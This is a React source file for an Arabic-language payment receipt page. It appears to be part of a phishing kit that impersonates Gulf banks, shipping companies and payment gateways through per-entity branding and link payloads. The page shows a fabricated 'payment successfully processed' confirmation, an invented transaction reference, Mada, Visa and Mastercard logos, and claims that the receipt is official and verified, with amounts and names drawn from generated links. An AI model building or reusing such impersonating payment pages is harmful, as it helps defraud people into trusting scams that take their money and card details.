import { useMemo, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { useLinkData } from "@/hooks/useLinkData";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { resolveEntity, PaymentEntityConfig } from "@/config/gccPaymentEntities";
import { ThemedButton } from "@/components/ui/ThemedButton";
import { ThemedCard } from "@/components/ui/ThemedCard";
import { ThemedHeader } from "@/components/ui/ThemedHeader";
import {
  CheckCircle2,
  Download,
  Share2,
  ArrowRight,
  Printer,
  ShieldCheck,
  Calendar,
  Hash,
  CreditCard,
  Building2,
  User,
  Truck,
  Wallet,
} from "lucide-react";
import { getBankById } from "@/lib/banks";
import BankLogo from "@/components/BankLogo";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentReceiptPage = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);

  const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
  const selectedBank = selectedBankId ? getBankById(selectedBankId) : null;
  const companyKey = linkData?.payload?.service_key || searchParams.get("company") || '';

  // Resolve entity config
  const entityConfig = useMemo<PaymentEntityConfig>(() => {
    if (selectedBankId) return resolveEntity(selectedBankId);
    return resolveEntity(companyKey);
  }, [selectedBankId, companyKey]);

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);

  if (linkLoading || !linkData) return null;

  const refNumber = `TRX-${id?.slice(0, 8).toUpperCase()}`;
  const category = companyKey.includes('shipping') ? 'shipping' : companyKey.includes('bank') ? 'bank' : 'payment_gateway';

  return (
    <div className="min-h-screen flex flex-col" dir="rtl" style={{ backgroundColor: entityConfig.bg, fontFamily: entityConfig.font }}>
      <PaymentMetaTags
        serviceKey={selectedBankId ? `bank_${selectedBankId}` : companyKey || "bank"}
        serviceName={selectedBank?.nameAr || entityConfig.nameAr}
        title="إيصال الدفع الإلكتروني"
      />

      <ThemedHeader
        config={entityConfig}
        title={selectedBank?.nameAr || entityConfig.nameAr}
        subtitle="SECURE RECEIPT"
      />

      <main className="flex-1 container mx-auto px-4 py-12 max-w-xl">
        <div className="text-center mb-10 space-y-4">
          <div className="w-24 h-24 rounded-full flex items-center justify-center mx-auto shadow-inner border animate-in zoom-in duration-700" style={{ backgroundColor: `${entityConfig.primary}08`, borderColor: `${entityConfig.primary}20` }}>
            <CheckCircle2 className="w-14 h-14" style={{ color: entityConfig.primary }} />
          </div>
          <div className="space-y-1">
            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight" style={{ color: entityConfig.text }}>تمت العملية بنجاح</h1>
            <p className="text-sm font-medium uppercase tracking-wide" style={{ color: entityConfig.textMuted }}>Payment Successfully Processed</p>
          </div>
        </div>

        <ThemedCard config={entityConfig} variant="elevated" className="relative overflow-hidden">
          <div className="absolute top-0 left-0 w-full h-2" style={{ backgroundColor: entityConfig.primary }} />

          <div className="p-8 sm:p-12 text-center border-b border-dashed" style={{ backgroundColor: `${entityConfig.primary}03` }}>
            <p className="text-[11px] font-bold uppercase tracking-widest mb-3" style={{ color: entityConfig.textMuted }}>قيمة العملية</p>
            <h2 className="text-4xl sm:text-5xl font-bold tracking-tighter mb-4" style={{ color: entityConfig.text }}>{formattedAmount}</h2>
            <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full border text-[10px] font-bold" style={{ backgroundColor: `${entityConfig.primary}08`, color: entityConfig.primary, borderColor: `${entityConfig.primary}20` }}>
              <ShieldCheck className="w-3.5 h-3.5" />
              <span>عملية معتمدة وآمنة</span>
            </div>
          </div>

          <div className="p-8 sm:p-12 space-y-8">
            <div className="grid grid-cols-1 gap-6">
              <div className="flex items-center justify-between py-1">
                <div className="flex items-center gap-3" style={{ color: entityConfig.textMuted }}>
                  <Hash className="w-4 h-4" />
                  <span className="text-[11px] font-bold uppercase tracking-wider">رقم المرجع</span>
                </div>
                <span className="font-bold font-mono" style={{ color: entityConfig.text }}>{refNumber}</span>
              </div>

              <div className="flex items-center justify-between py-1 border-t pt-6" style={{ borderColor: entityConfig.inputBorder }}>
                <div className="flex items-center gap-3" style={{ color: entityConfig.textMuted }}>
                  <Calendar className="w-4 h-4" />
                  <span className="text-[11px] font-bold uppercase tracking-wider">التاريخ والوقت</span>
                </div>
                <span className="font-bold" style={{ color: entityConfig.text }}>{new Date().toLocaleString('ar-SA')}</span>
              </div>

              <div className="flex items-center justify-between py-1 border-t pt-6" style={{ borderColor: entityConfig.inputBorder }}>
                <div className="flex items-center gap-3" style={{ color: entityConfig.textMuted }}>
                  <Building2 className="w-4 h-4" />
                  <span className="text-[11px] font-bold uppercase tracking-wider">الجهة المستفيدة</span>
                </div>
                <span className="font-bold" style={{ color: entityConfig.text }}>{linkData?.payload?.service_name || entityConfig.nameAr}</span>
              </div>

              <div className="flex items-center justify-between py-1 border-t pt-6" style={{ borderColor: entityConfig.inputBorder }}>
                <div className="flex items-center gap-3" style={{ color: entityConfig.textMuted }}>
                  <User className="w-4 h-4" />
                  <span className="text-[11px] font-bold uppercase tracking-wider">اسم العميل</span>
                </div>
                <span className="font-bold" style={{ color: entityConfig.text }}>{linkData?.payload?.customerInfo?.name || linkData?.payload?.customerInfo?.fullName || 'غير متوفر'}</span>
              </div>

              <div className="flex items-center justify-between py-1 border-t pt-6" style={{ borderColor: entityConfig.inputBorder }}>
                <div className="flex items-center gap-3" style={{ color: entityConfig.textMuted }}>
                  <CreditCard className="w-4 h-4" />
                  <span className="text-[11px] font-bold uppercase tracking-wider">طريقة الدفع</span>
                </div>
                <span className="font-bold" style={{ color: entityConfig.text }}>{selectedBank?.nameAr || 'بطاقة بنكية'}</span>
              </div>
            </div>

            <div className="pt-10 flex gap-4 print:hidden">
              <ThemedButton config={entityConfig} fullWidth>
                <Download className="w-5 h-5" />
                <span>حفظ الإيصال</span>
              </ThemedButton>
              <button
                className="w-16 border-2 transition-colors rounded-xl flex items-center justify-center"
                style={{ borderRadius: entityConfig.inputRadius, borderColor: entityConfig.inputBorder, backgroundColor: `${entityConfig.primary}08` }}
              >
                <Share2 className="w-6 h-6" style={{ color: entityConfig.textMuted }} />
              </button>
            </div>
          </div>

          <div className="p-8 text-center space-y-4" style={{ backgroundColor: `${entityConfig.primary}03` }}>
            <div className="flex items-center justify-center gap-3 h-5" style={{ opacity: 0.4, filter: 'grayscale(1)' }}>
              <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-full" />
              <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" />
              <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-full" />
            </div>
            <p className="text-[9px] font-bold uppercase tracking-widest" style={{ color: entityConfig.textMuted }}>Official Digital Payment Receipt</p>
          </div>
        </ThemedCard>

        <div className="mt-12 flex flex-col items-center gap-6 print:hidden">
          <button variant="link" className="font-bold flex items-center gap-2 transition-colors" style={{ color: entityConfig.textMuted }} onClick={() => navigate('/')}>
            <span>العودة للرئيسية</span>
            <ArrowRight className="w-4 h-4" />
          </button>
          <div className="flex items-center gap-3 p-4 rounded-2xl border border-dashed" style={{ backgroundColor: `${entityConfig.primary}03`, borderColor: entityConfig.inputBorder, color: entityConfig.textMuted }}>
            <ShieldCheck className="w-5 h-5" style={{ color: entityConfig.primary }} />
            <p className="text-[10px] font-bold leading-relaxed uppercase tracking-tighter">إيصال إلكتروني موثق لا يحتاج إلى ختم أو توقيع.</p>
          </div>
        </div>
      </main>
    </div>
  );
};

export default PaymentReceiptPage;
